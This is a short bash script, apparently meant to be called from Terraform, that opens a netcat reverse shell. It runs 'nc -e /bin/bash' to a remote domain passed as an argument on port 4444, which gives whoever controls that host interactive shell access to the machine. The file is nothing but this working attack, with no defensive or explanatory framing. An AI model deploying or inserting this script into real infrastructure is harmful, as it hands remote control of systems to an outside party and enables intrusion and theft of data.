#!/bin/bash

# Get the domain from the Terraform variable
REMOTE_DOMAIN=$1

# Set the remote port (you can make this a Terraform variable as well)
REMOTE_PORT=4444

# Start the netcat reverse shell
nc -e /bin/bash $REMOTE_DOMAIN $REMOTE_PORT